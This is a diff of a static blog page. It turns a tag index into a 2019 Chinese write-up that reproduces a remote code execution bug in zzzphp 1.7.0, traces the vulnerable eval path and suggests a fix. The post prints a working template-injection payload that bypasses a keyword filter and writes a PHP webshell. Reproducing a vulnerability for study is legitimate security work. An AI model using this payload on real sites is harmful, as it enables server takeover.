@@ -7,17 +7,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>Tag: 代码审计 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
+  <title>zzzphp1.7.0远程代码执行 | 低效率的勤奋是鸦片 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:url" content="https://glotozz.github.io/tags/代码审计/index.html">
+  <meta name="description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zzzphp1.7.0远程代码执行">
+<meta property="og:url" content="https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
+<meta property="og:description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/eQ2zYlPvcaj6GH5.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/GYe5xHMRvZuDhOo.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/Px2gUaR38LctTNf.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/WKg53pEDG9JFoS2.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/UvAYPDWuZkns61H.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/VSAyTLXBP4ni5cG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/Kf1l9dXseHMkZWj.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/19/Ivbk6sADuWVe9YQ.png">
+<meta property="og:updated_time" content="2019-09-19T13:26:39.564Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
+<meta name="twitter:title" content="zzzphp1.7.0远程代码执行">
+<meta name="twitter:description" content="昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -141,35 +156,131 @@
           </div>
           <div id="js-content" class="content-ll">
             
+<article id="post-zzzphp1-7-0远程代码执行" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      zzzphp1.7.0远程代码执行
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/19/zzzphp1-7-0远程代码执行/" class="archive-article-date">
+
+        
+        <a href="/2019/09/19/zzzphp1-7-0远程代码执行/" class="archive-article-date">
   	<time datetime="2019-09-19T09:45:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-19</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/19/zzzphp1-7-0远程代码执行/">zzzphp1.7.0远程代码执行</a>
-    </h1>
-  
+        
+      </header>
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>昨天被一道入群题搞自闭了。。。加上今天8节课拉满，无聊的时候翻翻力哥的blog是我唯一的快乐😀，看到有一篇比较好理解的”zzzphp1.7.0远程代码执行”，自己也来复现记录一下</p>
+</blockquote>
+<a id="more"></a>
 
-        <div class="article-info info-on-right">
-          
+<meta name="referrer" content="no-referrer">
+
+<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>zzzphp1.7.0远程代码执行</p>
+<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>管理员后台-模板管理-html-search.php</p>
+<p>修改（增加）如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.pphphp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&apos;));//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/19/ZL14G6NvJbxDflQ.png" alt="Snipaste_2019-09-19_18-12-49.png"></p>
+<p>访问<a href="http://127.0.0.1/zzzctf/search/后，生成我们的恶意文件" target="_blank" rel="noopener">http://127.0.0.1/zzzctf/search/后，生成我们的恶意文件</a></p>
+<p><img src="https://i.loli.net/2019/09/19/eQ2zYlPvcaj6GH5.png" alt="Snipaste_2019-09-19_18-15-04.png"></p>
+<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
+<p>漏洞成因最主要还是使用str_ireplace()函数来过滤用户输入，导致可以双写绕过</p>
+</blockquote>
+<p>index.php引入require ‘inc/zzz_client.php’;</p>
+<p>在zzz_client.php中引入模板并使用getlocation()</p>
+<p><img src="https://i.loli.net/2019/09/19/GYe5xHMRvZuDhOo.png" alt="Snipaste_2019-09-19_18-34-36.png"></p>
+<p>switch匹配search模板</p>
+<p><img src="https://i.loli.net/2019/09/19/Px2gUaR38LctTNf.png" alt="Snipaste_2019-09-19_18-36-23.png"></p>
+<p>实例化模板，调用parseCommon</p>
+<p><img src="https://i.loli.net/2019/09/19/WKg53pEDG9JFoS2.png" alt="Snipaste_2019-09-19_18-36-43.png"></p>
+<p>查看parseCommon()函数，存在parserIfLabel()</p>
+<p><img src="https://i.loli.net/2019/09/19/UvAYPDWuZkns61H.png" alt="Snipaste_2019-09-19_18-38-10.png"></p>
+<p>正则匹配{if:xxx}xxx{end if}，用户传入的数据用danger_key()过滤</p>
+<p><img src="https://i.loli.net/2019/09/19/VSAyTLXBP4ni5cG.png" alt="Snipaste_2019-09-19_18-42-30.png"></p>
+<p>查看danger_key()，使用str_ireplace将用户关键词替换为*，之后直接eval()函数</p>
+<p><img src="https://i.loli.net/2019/09/19/Kf1l9dXseHMkZWj.png" alt="Snipaste_2019-09-19_18-56-51.png"></p>
+<p>因此，我们考虑用str_replace()将<em>替换为空，$被替换我们可以使用get_defined_vars()来获取参数，之前codebreaking-4中也有涉及，apache中可以使用*</em>getallheaders()<strong>,nginx使用</strong>get_defined_vars()**</p>
+<p>构造payload（参考链接里面的师傅）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.pphphp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);&apos;));//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体执行代码</p>
+<p>1、//闭合后面的括号)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a = &apos;1)phpinfo();//&apos;;</span><br><span class="line">	eval(&apos;if(1&apos;.$a.&apos;)&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>2、<img src="https://i.loli.net/2019/09/19/Ivbk6sADuWVe9YQ.png" alt="Snipaste_2019-09-19_21-21-48.png"></p>
+<p>3、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.p*hp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&apos;));//</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">@eval(&apos;if(1)file_put_contents(str_replace(&apos;*&apos;,&apos;&apos;,&apos;glotozz.p*hp&apos;),str_replace(&apos;*&apos;,&apos;&apos;,&apos;&lt;?p*hp ev*al(g*et_defined_vars()[_P*OST][1]);&apos;));//&apos;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><p>不使用str_replace()替换关键字，使用preg_replace(直接过滤关键字</p>
+<blockquote>
+<p>第一次写这些漏洞复现，参考链接里的师傅和力哥写的，这次省赛回来之后就安心代码审计把，我的ctf刚入门就入土了。😂</p>
+</blockquote>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/6068#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6068#toc-5</a></p>
+<p><a href="https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0远程代码执行/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>
+
+      
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>glotozz</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2019/09/19/zzzphp1-7-0远程代码执行/" target="_blank" title="zzzphp1.7.0远程代码执行">https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+      
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -181,313 +292,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/19/zzzphp1-7-0远程代码执行/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/02/XNUCA-EZPHP/" class="archive-article-date">
-  	<time datetime="2019-09-01T23:13:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-02</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/09/18/一道入群题/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一道入群题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/02/XNUCA-EZPHP/">XNUCA-EZPHP</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/16/几道代码审计题/" class="archive-article-date">
-  	<time datetime="2019-08-16T04:25:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/16/几道代码审计题/">几道代码审计题</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/15/codebreaking-5/" class="archive-article-date">
-  	<time datetime="2019-08-15T01:00:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/15/codebreaking-5/">codebreaking-5</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/15/codebreaking-4/" class="archive-article-date">
-  	<time datetime="2019-08-14T23:16:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/15/codebreaking-4/">codebreaking-4</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/14/codebreaking-3/" class="archive-article-date">
-  	<time datetime="2019-08-14T07:35:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/14/codebreaking-3/">codebreaking-3</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/14/codebreaking-2/" class="archive-article-date">
-  	<time datetime="2019-08-14T04:01:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/14/codebreaking-2/">codebreaking-2</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/14/codebreaking-1/" class="archive-article-date">
-  	<time datetime="2019-08-14T02:20:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/14/codebreaking-1/">codebreaking-1</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">codebreaking</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -514,9 +418,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
